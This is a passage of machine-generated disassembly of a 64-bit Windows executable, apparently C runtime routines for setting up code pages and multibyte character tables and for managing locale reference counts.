   1400078d5:	48 83 64 24 68 00    	andq   $0x0,0x68(%rsp)
   1400078db:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
   1400078e0:	48 8b c7             	mov    %rdi,%rax
   1400078e3:	48 89 5c 24 48       	mov    %rbx,0x48(%rsp)
   1400078e8:	33 d2                	xor    %edx,%edx
   1400078ea:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   1400078ef:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   1400078f4:	48 89 5c 24 58       	mov    %rbx,0x58(%rsp)
   1400078f9:	c6 44 24 70 00       	movb   $0x0,0x70(%rsp)
   1400078fe:	e8 b9 fd ff ff       	call   0x1400076bc
   140007903:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   140007908:	41 b9 e9 fd 00 00    	mov    $0xfde9,%r9d
   14000790e:	44 39 48 0c          	cmp    %r9d,0xc(%rax)
   140007912:	75 15                	jne    0x140007929
   140007914:	80 7c 24 40 00       	cmpb   $0x0,0x40(%rsp)
   140007919:	74 47                	je     0x140007962
   14000791b:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   140007920:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   140007927:	eb 39                	jmp    0x140007962
   140007929:	e8 8a 24 00 00       	call   0x140009db8
   14000792e:	85 c0                	test   %eax,%eax
   140007930:	75 1a                	jne    0x14000794c
   140007932:	38 44 24 40          	cmp    %al,0x40(%rsp)
   140007936:	74 0c                	je     0x140007944
   140007938:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   14000793d:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   140007944:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   14000794a:	eb 16                	jmp    0x140007962
   14000794c:	80 7c 24 40 00       	cmpb   $0x0,0x40(%rsp)
   140007951:	74 0c                	je     0x14000795f
   140007953:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   140007958:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   14000795f:	45 33 c9             	xor    %r9d,%r9d
   140007962:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   140007967:	48 8d 54 24 48       	lea    0x48(%rsp),%rdx
   14000796c:	48 8d 4d 80          	lea    -0x80(%rbp),%rcx
   140007970:	e8 eb fd ff ff       	call   0x140007760
   140007975:	8b 44 24 68          	mov    0x68(%rsp),%eax
   140007979:	48 8b 8d 90 01 00 00 	mov    0x190(%rbp),%rcx
   140007980:	48 33 cc             	xor    %rsp,%rcx
   140007983:	e8 d8 99 ff ff       	call   0x140001360
   140007988:	4c 8d 9c 24 a0 02 00 	lea    0x2a0(%rsp),%r11
   14000798f:	00 
   140007990:	49 8b 5b 18          	mov    0x18(%r11),%rbx
   140007994:	49 8b 7b 20          	mov    0x20(%r11),%rdi
   140007998:	49 8b e3             	mov    %r11,%rsp
   14000799b:	5d                   	pop    %rbp
   14000799c:	c3                   	ret
   14000799d:	cc                   	int3
   14000799e:	cc                   	int3
   14000799f:	cc                   	int3
   1400079a0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400079a5:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   1400079aa:	57                   	push   %rdi
   1400079ab:	48 83 ec 40          	sub    $0x40,%rsp
   1400079af:	49 8b f9             	mov    %r9,%rdi
   1400079b2:	49 8b d8             	mov    %r8,%rbx
   1400079b5:	8b 0a                	mov    (%rdx),%ecx
   1400079b7:	e8 b0 12 00 00       	call   0x140008c6c
   1400079bc:	90                   	nop
   1400079bd:	48 8b 03             	mov    (%rbx),%rax
   1400079c0:	48 8b 08             	mov    (%rax),%rcx
   1400079c3:	48 8b 81 88 00 00 00 	mov    0x88(%rcx),%rax
   1400079ca:	48 83 c0 18          	add    $0x18,%rax
   1400079ce:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   1400079d3:	48 8b 0d ee 39 01 00 	mov    0x139ee(%rip),%rcx        # 0x14001b3c8
   1400079da:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   1400079df:	48 85 c9             	test   %rcx,%rcx
   1400079e2:	74 6f                	je     0x140007a53
   1400079e4:	48 85 c0             	test   %rax,%rax
   1400079e7:	74 5d                	je     0x140007a46
   1400079e9:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   1400079ef:	45 8b c8             	mov    %r8d,%r9d
   1400079f2:	41 8d 50 7e          	lea    0x7e(%r8),%edx
   1400079f6:	0f 10 00             	movups (%rax),%xmm0
   1400079f9:	0f 11 01             	movups %xmm0,(%rcx)
   1400079fc:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140007a00:	0f 11 49 10          	movups %xmm1,0x10(%rcx)
   140007a04:	0f 10 40 20          	movups 0x20(%rax),%xmm0
   140007a08:	0f 11 41 20          	movups %xmm0,0x20(%rcx)
   140007a0c:	0f 10 48 30          	movups 0x30(%rax),%xmm1
   140007a10:	0f 11 49 30          	movups %xmm1,0x30(%rcx)
   140007a14:	0f 10 40 40          	movups 0x40(%rax),%xmm0
   140007a18:	0f 11 41 40          	movups %xmm0,0x40(%rcx)
   140007a1c:	0f 10 48 50          	movups 0x50(%rax),%xmm1
   140007a20:	0f 11 49 50          	movups %xmm1,0x50(%rcx)
   140007a24:	0f 10 40 60          	movups 0x60(%rax),%xmm0
   140007a28:	0f 11 41 60          	movups %xmm0,0x60(%rcx)
   140007a2c:	48 03 ca             	add    %rdx,%rcx
   140007a2f:	0f 10 48 70          	movups 0x70(%rax),%xmm1
   140007a33:	0f 11 49 f0          	movups %xmm1,-0x10(%rcx)
   140007a37:	48 03 c2             	add    %rdx,%rax
   140007a3a:	49 83 e9 01          	sub    $0x1,%r9
   140007a3e:	75 b6                	jne    0x1400079f6
   140007a40:	8a 00                	mov    (%rax),%al
   140007a42:	88 01                	mov    %al,(%rcx)
   140007a44:	eb 27                	jmp    0x140007a6d
   140007a46:	33 d2                	xor    %edx,%edx
   140007a48:	41 b8 01 01 00 00    	mov    $0x101,%r8d
   140007a4e:	e8 1d 75 00 00       	call   0x14000ef70
   140007a53:	e8 5c f1 ff ff       	call   0x140006bb4
   140007a58:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   140007a5e:	e8 15 f0 ff ff       	call   0x140006a78
   140007a63:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140007a69:	41 8d 50 7e          	lea    0x7e(%r8),%edx
   140007a6d:	48 8b 03             	mov    (%rbx),%rax
   140007a70:	48 8b 08             	mov    (%rax),%rcx
   140007a73:	48 8b 81 88 00 00 00 	mov    0x88(%rcx),%rax
   140007a7a:	48 05 19 01 00 00    	add    $0x119,%rax
   140007a80:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140007a85:	48 8b 0d 44 39 01 00 	mov    0x13944(%rip),%rcx        # 0x14001b3d0
   140007a8c:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140007a91:	48 85 c9             	test   %rcx,%rcx
   140007a94:	74 5e                	je     0x140007af4
   140007a96:	48 85 c0             	test   %rax,%rax
   140007a99:	74 4c                	je     0x140007ae7
   140007a9b:	0f 10 00             	movups (%rax),%xmm0
   140007a9e:	0f 11 01             	movups %xmm0,(%rcx)
   140007aa1:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140007aa5:	0f 11 49 10          	movups %xmm1,0x10(%rcx)
   140007aa9:	0f 10 40 20          	movups 0x20(%rax),%xmm0
   140007aad:	0f 11 41 20          	movups %xmm0,0x20(%rcx)
   140007ab1:	0f 10 48 30          	movups 0x30(%rax),%xmm1
   140007ab5:	0f 11 49 30          	movups %xmm1,0x30(%rcx)
   140007ab9:	0f 10 40 40          	movups 0x40(%rax),%xmm0
   140007abd:	0f 11 41 40          	movups %xmm0,0x40(%rcx)
   140007ac1:	0f 10 48 50          	movups 0x50(%rax),%xmm1
   140007ac5:	0f 11 49 50          	movups %xmm1,0x50(%rcx)
   140007ac9:	0f 10 40 60          	movups 0x60(%rax),%xmm0
   140007acd:	0f 11 41 60          	movups %xmm0,0x60(%rcx)
   140007ad1:	48 03 ca             	add    %rdx,%rcx
   140007ad4:	0f 10 48 70          	movups 0x70(%rax),%xmm1
   140007ad8:	0f 11 49 f0          	movups %xmm1,-0x10(%rcx)
   140007adc:	48 03 c2             	add    %rdx,%rax
   140007adf:	49 83 e8 01          	sub    $0x1,%r8
   140007ae3:	75 b6                	jne    0x140007a9b
   140007ae5:	eb 1d                	jmp    0x140007b04
   140007ae7:	33 d2                	xor    %edx,%edx
   140007ae9:	41 b8 00 01 00 00    	mov    $0x100,%r8d
   140007aef:	e8 7c 74 00 00       	call   0x14000ef70
   140007af4:	e8 bb f0 ff ff       	call   0x140006bb4
   140007af9:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   140007aff:	e8 74 ef ff ff       	call   0x140006a78
   140007b04:	48 8b 43 08          	mov    0x8(%rbx),%rax
   140007b08:	48 8b 08             	mov    (%rax),%rcx
   140007b0b:	48 8b 11             	mov    (%rcx),%rdx
   140007b0e:	83 c8 ff             	or     $0xffffffff,%eax
   140007b11:	f0 0f c1 02          	lock xadd %eax,(%rdx)
   140007b15:	83 f8 01             	cmp    $0x1,%eax
   140007b18:	75 1b                	jne    0x140007b35
   140007b1a:	48 8b 43 08          	mov    0x8(%rbx),%rax
   140007b1e:	48 8b 08             	mov    (%rax),%rcx
   140007b21:	48 8d 05 78 25 01 00 	lea    0x12578(%rip),%rax        # 0x14001a0a0
   140007b28:	48 39 01             	cmp    %rax,(%rcx)
   140007b2b:	74 08                	je     0x140007b35
   140007b2d:	48 8b 09             	mov    (%rcx),%rcx
   140007b30:	e8 17 f1 ff ff       	call   0x140006c4c
   140007b35:	48 8b 03             	mov    (%rbx),%rax
   140007b38:	48 8b 10             	mov    (%rax),%rdx
   140007b3b:	48 8b 43 08          	mov    0x8(%rbx),%rax
   140007b3f:	48 8b 08             	mov    (%rax),%rcx
   140007b42:	48 8b 82 88 00 00 00 	mov    0x88(%rdx),%rax
   140007b49:	48 89 01             	mov    %rax,(%rcx)
   140007b4c:	48 8b 03             	mov    (%rbx),%rax
   140007b4f:	48 8b 08             	mov    (%rax),%rcx
   140007b52:	48 8b 81 88 00 00 00 	mov    0x88(%rcx),%rax
   140007b59:	f0 ff 00             	lock incl (%rax)
   140007b5c:	8b 0f                	mov    (%rdi),%ecx
   140007b5e:	e8 5d 11 00 00       	call   0x140008cc0
   140007b63:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140007b68:	48 83 c4 40          	add    $0x40,%rsp
   140007b6c:	5f                   	pop    %rdi
   140007b6d:	c3                   	ret
   140007b6e:	cc                   	int3
   140007b6f:	cc                   	int3
   140007b70:	40 53                	rex push %rbx
   140007b72:	48 83 ec 40          	sub    $0x40,%rsp
   140007b76:	8b d9                	mov    %ecx,%ebx
   140007b78:	33 d2                	xor    %edx,%edx
   140007b7a:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140007b7f:	e8 38 fb ff ff       	call   0x1400076bc
   140007b84:	83 25 55 38 01 00 00 	andl   $0x0,0x13855(%rip)        # 0x14001b3e0
   140007b8b:	83 fb fe             	cmp    $0xfffffffe,%ebx
   140007b8e:	75 12                	jne    0x140007ba2
   140007b90:	c7 05 46 38 01 00 01 	movl   $0x1,0x13846(%rip)        # 0x14001b3e0
   140007b97:	00 00 00 
   140007b9a:	ff 15 28 86 00 00    	call   *0x8628(%rip)        # 0x1400101c8
   140007ba0:	eb 15                	jmp    0x140007bb7
   140007ba2:	83 fb fd             	cmp    $0xfffffffd,%ebx
   140007ba5:	75 14                	jne    0x140007bbb
   140007ba7:	c7 05 2f 38 01 00 01 	movl   $0x1,0x1382f(%rip)        # 0x14001b3e0
   140007bae:	00 00 00 
   140007bb1:	ff 15 09 86 00 00    	call   *0x8609(%rip)        # 0x1400101c0
   140007bb7:	8b d8                	mov    %eax,%ebx
   140007bb9:	eb 17                	jmp    0x140007bd2
   140007bbb:	83 fb fc             	cmp    $0xfffffffc,%ebx
   140007bbe:	75 12                	jne    0x140007bd2
   140007bc0:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   140007bc5:	c7 05 11 38 01 00 01 	movl   $0x1,0x13811(%rip)        # 0x14001b3e0
   140007bcc:	00 00 00 
   140007bcf:	8b 58 0c             	mov    0xc(%rax),%ebx
   140007bd2:	80 7c 24 38 00       	cmpb   $0x0,0x38(%rsp)
   140007bd7:	74 0c                	je     0x140007be5
   140007bd9:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   140007bde:	83 a1 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rcx)
   140007be5:	8b c3                	mov    %ebx,%eax
   140007be7:	48 83 c4 40          	add    $0x40,%rsp
   140007beb:	5b                   	pop    %rbx
   140007bec:	c3                   	ret
   140007bed:	cc                   	int3
   140007bee:	cc                   	int3
   140007bef:	cc                   	int3
   140007bf0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007bf5:	57                   	push   %rdi
   140007bf6:	48 83 ec 20          	sub    $0x20,%rsp
   140007bfa:	48 8b d9             	mov    %rcx,%rbx
   140007bfd:	33 d2                	xor    %edx,%edx
   140007bff:	48 83 c1 18          	add    $0x18,%rcx
   140007c03:	41 b8 01 01 00 00    	mov    $0x101,%r8d
   140007c09:	e8 62 73 00 00       	call   0x14000ef70
   140007c0e:	33 d2                	xor    %edx,%edx
   140007c10:	48 8d 7b 0c          	lea    0xc(%rbx),%rdi
   140007c14:	0f b7 c2             	movzwl %dx,%eax
   140007c17:	4c 8d 0d 82 24 01 00 	lea    0x12482(%rip),%r9        # 0x14001a0a0
   140007c1e:	48 89 53 04          	mov    %rdx,0x4(%rbx)
   140007c22:	4c 8b c3             	mov    %rbx,%r8
   140007c25:	48 89 93 20 02 00 00 	mov    %rdx,0x220(%rbx)
   140007c2c:	8d 4a 06             	lea    0x6(%rdx),%ecx
   140007c2f:	66 f3 ab             	rep stos %ax,(%rdi)
   140007c32:	48 8d 05 7f 24 01 00 	lea    0x1247f(%rip),%rax        # 0x14001a0b8
   140007c39:	8b fa                	mov    %edx,%edi
   140007c3b:	4c 2b c0             	sub    %rax,%r8
   140007c3e:	4a 8d 0c 0f          	lea    (%rdi,%r9,1),%rcx
   140007c42:	48 ff c7             	inc    %rdi
   140007c45:	8a 41 18             	mov    0x18(%rcx),%al
   140007c48:	41 88 44 08 30       	mov    %al,0x30(%r8,%rcx,1)
   140007c4d:	48 81 ff 01 01 00 00 	cmp    $0x101,%rdi
   140007c54:	7c e8                	jl     0x140007c3e
   140007c56:	48 8d 05 5c 25 01 00 	lea    0x1255c(%rip),%rax        # 0x14001a1b9
   140007c5d:	48 2b d8             	sub    %rax,%rbx
   140007c60:	4a 8d 0c 0a          	lea    (%rdx,%r9,1),%rcx
   140007c64:	48 ff c2             	inc    %rdx
   140007c67:	8a 81 19 01 00 00    	mov    0x119(%rcx),%al
   140007c6d:	88 84 0b 32 02 00 00 	mov    %al,0x232(%rbx,%rcx,1)
   140007c74:	48 81 fa 00 01 00 00 	cmp    $0x100,%rdx
   140007c7b:	7c e3                	jl     0x140007c60
   140007c7d:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140007c82:	48 83 c4 20          	add    $0x20,%rsp
   140007c86:	5f                   	pop    %rdi
   140007c87:	c3                   	ret
   140007c88:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140007c8d:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   140007c92:	55                   	push   %rbp
   140007c93:	48 8d ac 24 80 f9 ff 	lea    -0x680(%rsp),%rbp
   140007c9a:	ff 
   140007c9b:	48 81 ec 80 07 00 00 	sub    $0x780,%rsp
   140007ca2:	48 8b 05 57 23 01 00 	mov    0x12357(%rip),%rax        # 0x14001a000
   140007ca9:	48 33 c4             	xor    %rsp,%rax
   140007cac:	48 89 85 70 06 00 00 	mov    %rax,0x670(%rbp)
   140007cb3:	48 8b f9             	mov    %rcx,%rdi
   140007cb6:	8b 49 04             	mov    0x4(%rcx),%ecx
   140007cb9:	81 f9 e9 fd 00 00    	cmp    $0xfde9,%ecx
   140007cbf:	0f 84 47 01 00 00    	je     0x140007e0c
   140007cc5:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   140007cca:	ff 15 00 85 00 00    	call   *0x8500(%rip)        # 0x1400101d0
   140007cd0:	85 c0                	test   %eax,%eax
   140007cd2:	0f 84 34 01 00 00    	je     0x140007e0c
   140007cd8:	33 c0                	xor    %eax,%eax
   140007cda:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140007cdf:	bb 00 01 00 00       	mov    $0x100,%ebx
   140007ce4:	88 01                	mov    %al,(%rcx)
   140007ce6:	ff c0                	inc    %eax
   140007ce8:	48 ff c1             	inc    %rcx
   140007ceb:	3b c3                	cmp    %ebx,%eax
   140007ced:	72 f5                	jb     0x140007ce4
   140007cef:	8a 44 24 56          	mov    0x56(%rsp),%al
   140007cf3:	48 8d 54 24 56       	lea    0x56(%rsp),%rdx
   140007cf8:	c6 44 24 70 20       	movb   $0x20,0x70(%rsp)
   140007cfd:	eb 20                	jmp    0x140007d1f
   140007cff:	44 0f b6 42 01       	movzbl 0x1(%rdx),%r8d
   140007d04:	0f b6 c8             	movzbl %al,%ecx
   140007d07:	eb 0b                	jmp    0x140007d14
   140007d09:	3b cb                	cmp    %ebx,%ecx
   140007d0b:	73 0c                	jae    0x140007d19
   140007d0d:	c6 44 0c 70 20       	movb   $0x20,0x70(%rsp,%rcx,1)
   140007d12:	ff c1                	inc    %ecx
   140007d14:	41 3b c8             	cmp    %r8d,%ecx
   140007d17:	76 f0                	jbe    0x140007d09
   140007d19:	48 83 c2 02          	add    $0x2,%rdx
   140007d1d:	8a 02                	mov    (%rdx),%al
   140007d1f:	84 c0                	test   %al,%al
   140007d21:	75 dc                	jne    0x140007cff
   140007d23:	8b 47 04             	mov    0x4(%rdi),%eax
   140007d26:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
   140007d2b:	83 64 24 30 00       	andl   $0x0,0x30(%rsp)
   140007d30:	44 8b cb             	mov    %ebx,%r9d
   140007d33:	89 44 24 28          	mov    %eax,0x28(%rsp)
   140007d37:	ba 01 00 00 00       	mov    $0x1,%edx
   140007d3c:	48 8d 85 70 02 00 00 	lea    0x270(%rbp),%rax
   140007d43:	33 c9                	xor    %ecx,%ecx
   140007d45:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140007d4a:	e8 b9 18 00 00       	call   0x140009608
   140007d4f:	83 64 24 40 00       	andl   $0x0,0x40(%rsp)
   140007d54:	4c 8d 4c 24 70       	lea    0x70(%rsp),%r9
   140007d59:	8b 47 04             	mov    0x4(%rdi),%eax
   140007d5c:	44 8b c3             	mov    %ebx,%r8d
   140007d5f:	48 8b 97 20 02 00 00 	mov    0x220(%rdi),%rdx
   140007d66:	33 c9                	xor    %ecx,%ecx
   140007d68:	89 44 24 38          	mov    %eax,0x38(%rsp)
   140007d6c:	48 8d 45 70          	lea    0x70(%rbp),%rax
   140007d70:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   140007d74:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140007d79:	89 5c 24 20          	mov    %ebx,0x20(%rsp)
   140007d7d:	e8 66 3d 00 00       	call   0x14000bae8
   140007d82:	83 64 24 40 00       	andl   $0x0,0x40(%rsp)
   140007d87:	4c 8d 4c 24 70       	lea    0x70(%rsp),%r9
   140007d8c:	8b 47 04             	mov    0x4(%rdi),%eax
   140007d8f:	41 b8 00 02 00 00    	mov    $0x200,%r8d
   140007d95:	48 8b 97 20 02 00 00 	mov    0x220(%rdi),%rdx
   140007d9c:	33 c9                	xor    %ecx,%ecx
   140007d9e:	89 44 24 38          	mov    %eax,0x38(%rsp)
   140007da2:	48 8d 85 70 01 00 00 	lea    0x170(%rbp),%rax
   140007da9:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   140007dad:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140007db2:	89 5c 24 20          	mov    %ebx,0x20(%rsp)
   140007db6:	e8 2d 3d 00 00       	call   0x14000bae8
   140007dbb:	4c 8d 45 70          	lea    0x70(%rbp),%r8
   140007dbf:	4c 2b c7             	sub    %rdi,%r8
   140007dc2:	4c 8d 8d 70 01 00 00 	lea    0x170(%rbp),%r9
   140007dc9:	4c 2b cf             	sub    %rdi,%r9
   140007dcc:	48 8d 95 70 02 00 00 	lea    0x270(%rbp),%rdx
   140007dd3:	48 8d 47 19          	lea    0x19(%rdi),%rax
   140007dd7:	f6 02 01             	testb  $0x1,(%rdx)
   140007dda:	74 0a                	je     0x140007de6
   140007ddc:	80 08 10             	orb    $0x10,(%rax)
   140007ddf:	41 8a 4c 00 e7       	mov    -0x19(%r8,%rax,1),%cl
   140007de4:	eb 11                	jmp    0x140007df7
   140007de6:	f6 02 02             	testb  $0x2,(%rdx)
   140007de9:	74 0a                	je     0x140007df5
   140007deb:	80 08 20             	orb    $0x20,(%rax)
   140007dee:	41 8a 4c 01 e7       	mov    -0x19(%r9,%rax,1),%cl
   140007df3:	eb 02                	jmp    0x140007df7
   140007df5:	32 c9                	xor    %cl,%cl
   140007df7:	88 88 00 01 00 00    	mov    %cl,0x100(%rax)
   140007dfd:	48 83 c2 02          	add    $0x2,%rdx
   140007e01:	48 ff c0             	inc    %rax
   140007e04:	48 83 eb 01          	sub    $0x1,%rbx
   140007e08:	75 cd                	jne    0x140007dd7
   140007e0a:	eb 3f                	jmp    0x140007e4b
   140007e0c:	33 d2                	xor    %edx,%edx
   140007e0e:	48 8d 4f 19          	lea    0x19(%rdi),%rcx
   140007e12:	bb 00 01 00 00       	mov    $0x100,%ebx
   140007e17:	44 8d 42 9f          	lea    -0x61(%rdx),%r8d
   140007e1b:	41 8d 40 20          	lea    0x20(%r8),%eax
   140007e1f:	83 f8 19             	cmp    $0x19,%eax
   140007e22:	77 08                	ja     0x140007e2c
   140007e24:	80 09 10             	orb    $0x10,(%rcx)
   140007e27:	8d 42 20             	lea    0x20(%rdx),%eax
   140007e2a:	eb 10                	jmp    0x140007e3c
   140007e2c:	41 83 f8 19          	cmp    $0x19,%r8d
   140007e30:	77 08                	ja     0x140007e3a
   140007e32:	80 09 20             	orb    $0x20,(%rcx)
   140007e35:	8d 42 e0             	lea    -0x20(%rdx),%eax
   140007e38:	eb 02                	jmp    0x140007e3c
   140007e3a:	32 c0                	xor    %al,%al
   140007e3c:	88 81 00 01 00 00    	mov    %al,0x100(%rcx)
   140007e42:	ff c2                	inc    %edx
   140007e44:	48 ff c1             	inc    %rcx
   140007e47:	3b d3                	cmp    %ebx,%edx
   140007e49:	72 cc                	jb     0x140007e17
   140007e4b:	48 8b 8d 70 06 00 00 	mov    0x670(%rbp),%rcx
   140007e52:	48 33 cc             	xor    %rsp,%rcx
   140007e55:	e8 06 95 ff ff       	call   0x140001360
   140007e5a:	4c 8d 9c 24 80 07 00 	lea    0x780(%rsp),%r11
   140007e61:	00 
   140007e62:	49 8b 5b 18          	mov    0x18(%r11),%rbx
   140007e66:	49 8b 7b 20          	mov    0x20(%r11),%rdi
   140007e6a:	49 8b e3             	mov    %r11,%rsp
   140007e6d:	5d                   	pop    %rbp
   140007e6e:	c3                   	ret
   140007e6f:	cc                   	int3
   140007e70:	48 8b c4             	mov    %rsp,%rax
   140007e73:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140007e77:	48 89 70 10          	mov    %rsi,0x10(%rax)
   140007e7b:	4c 89 48 20          	mov    %r9,0x20(%rax)
   140007e7f:	4c 89 40 18          	mov    %r8,0x18(%rax)
   140007e83:	55                   	push   %rbp
   140007e84:	57                   	push   %rdi
   140007e85:	41 56                	push   %r14
   140007e87:	48 8d a8 78 fe ff ff 	lea    -0x188(%rax),%rbp
   140007e8e:	48 81 ec 70 02 00 00 	sub    $0x270,%rsp
   140007e95:	44 8a f2             	mov    %dl,%r14b
   140007e98:	8b d9                	mov    %ecx,%ebx
   140007e9a:	49 8b d1             	mov    %r9,%rdx
   140007e9d:	49 8b c8             	mov    %r8,%rcx
   140007ea0:	e8 3b 02 00 00       	call   0x1400080e0
   140007ea5:	8b cb                	mov    %ebx,%ecx
   140007ea7:	e8 c4 fc ff ff       	call   0x140007b70
   140007eac:	48 8b 8d a0 01 00 00 	mov    0x1a0(%rbp),%rcx
   140007eb3:	8b f8                	mov    %eax,%edi
   140007eb5:	4c 8b 81 88 00 00 00 	mov    0x88(%rcx),%r8
   140007ebc:	41 3b 40 04          	cmp    0x4(%r8),%eax
   140007ec0:	75 07                	jne    0x140007ec9
   140007ec2:	33 c0                	xor    %eax,%eax
   140007ec4:	e9 fe 01 00 00       	jmp    0x1400080c7
   140007ec9:	b9 28 02 00 00       	mov    $0x228,%ecx
   140007ece:	e8 d5 16 00 00       	call   0x1400095a8
   140007ed3:	48 8b d8             	mov    %rax,%rbx
   140007ed6:	48 85 c0             	test   %rax,%rax
   140007ed9:	75 0f                	jne    0x140007eea
   140007edb:	33 c9                	xor    %ecx,%ecx
   140007edd:	e8 6a ed ff ff       	call   0x140006c4c
   140007ee2:	83 c8 ff             	or     $0xffffffff,%eax
   140007ee5:	e9 dd 01 00 00       	jmp    0x1400080c7
   140007eea:	48 8b 85 a0 01 00 00 	mov    0x1a0(%rbp),%rax
   140007ef1:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140007ef6:	ba 04 00 00 00       	mov    $0x4,%edx
   140007efb:	44 8b c2             	mov    %edx,%r8d
   140007efe:	48 8b 80 88 00 00 00 	mov    0x88(%rax),%rax
   140007f05:	44 8d 4a 7c          	lea    0x7c(%rdx),%r9d
   140007f09:	0f 10 00             	movups (%rax),%xmm0
   140007f0c:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140007f10:	0f 11 01             	movups %xmm0,(%rcx)
   140007f13:	0f 10 40 20          	movups 0x20(%rax),%xmm0
   140007f17:	0f 11 49 10          	movups %xmm1,0x10(%rcx)
   140007f1b:	0f 10 48 30          	movups 0x30(%rax),%xmm1
   140007f1f:	0f 11 41 20          	movups %xmm0,0x20(%rcx)
   140007f23:	0f 10 40 40          	movups 0x40(%rax),%xmm0
   140007f27:	0f 11 49 30          	movups %xmm1,0x30(%rcx)
   140007f2b:	0f 10 48 50          	movups 0x50(%rax),%xmm1
   140007f2f:	0f 11 41 40          	movups %xmm0,0x40(%rcx)
   140007f33:	0f 10 40 60          	movups 0x60(%rax),%xmm0
   140007f37:	0f 11 49 50          	movups %xmm1,0x50(%rcx)
   140007f3b:	0f 10 48 70          	movups 0x70(%rax),%xmm1
   140007f3f:	49 03 c1             	add    %r9,%rax
   140007f42:	0f 11 41 60          	movups %xmm0,0x60(%rcx)
   140007f46:	49 03 c9             	add    %r9,%rcx
   140007f49:	0f 11 49 f0          	movups %xmm1,-0x10(%rcx)
   140007f4d:	49 83 e8 01          	sub    $0x1,%r8
   140007f51:	75 b6                	jne    0x140007f09
   140007f53:	0f 10 00             	movups (%rax),%xmm0
   140007f56:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140007f5a:	48 8b 40 20          	mov    0x20(%rax),%rax
   140007f5e:	0f 11 01             	movups %xmm0,(%rcx)
   140007f61:	0f 11 49 10          	movups %xmm1,0x10(%rcx)
   140007f65:	48 89 41 20          	mov    %rax,0x20(%rcx)
   140007f69:	48 8b cb             	mov    %rbx,%rcx
   140007f6c:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   140007f71:	0f 10 00             	movups (%rax),%xmm0
   140007f74:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140007f78:	0f 11 01             	movups %xmm0,(%rcx)
   140007f7b:	0f 10 40 20          	movups 0x20(%rax),%xmm0
   140007f7f:	0f 11 49 10          	movups %xmm1,0x10(%rcx)
   140007f83:	0f 10 48 30          	movups 0x30(%rax),%xmm1
   140007f87:	0f 11 41 20          	movups %xmm0,0x20(%rcx)
   140007f8b:	0f 10 40 40          	movups 0x40(%rax),%xmm0
   140007f8f:	0f 11 49 30          	movups %xmm1,0x30(%rcx)
   140007f93:	0f 10 48 50          	movups 0x50(%rax),%xmm1
   140007f97:	0f 11 41 40          	movups %xmm0,0x40(%rcx)
   140007f9b:	0f 10 40 60          	movups 0x60(%rax),%xmm0
   140007f9f:	0f 11 49 50          	movups %xmm1,0x50(%rcx)
   140007fa3:	0f 10 48 70          	movups 0x70(%rax),%xmm1
   140007fa7:	49 03 c1             	add    %r9,%rax
   140007faa:	0f 11 41 60          	movups %xmm0,0x60(%rcx)
   140007fae:	49 03 c9             	add    %r9,%rcx
   140007fb1:	0f 11 49 f0          	movups %xmm1,-0x10(%rcx)
   140007fb5:	48 83 ea 01          	sub    $0x1,%rdx
   140007fb9:	75 b6                	jne    0x140007f71
   140007fbb:	0f 10 00             	movups (%rax),%xmm0
   140007fbe:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140007fc2:	48 8b 40 20          	mov    0x20(%rax),%rax
   140007fc6:	0f 11 01             	movups %xmm0,(%rcx)
   140007fc9:	0f 11 49 10          	movups %xmm1,0x10(%rcx)
   140007fcd:	48 89 41 20          	mov    %rax,0x20(%rcx)
   140007fd1:	8b cf                	mov    %edi,%ecx
   140007fd3:	21 13                	and    %edx,(%rbx)
   140007fd5:	48 8b d3             	mov    %rbx,%rdx
   140007fd8:	e8 37 02 00 00       	call   0x140008214
   140007fdd:	83 cf ff             	or     $0xffffffff,%edi
   140007fe0:	8b f0                	mov    %eax,%esi
   140007fe2:	3b c7                	cmp    %edi,%eax
   140007fe4:	75 1a                	jne    0x140008000
   140007fe6:	e8 c9 eb ff ff       	call   0x140006bb4
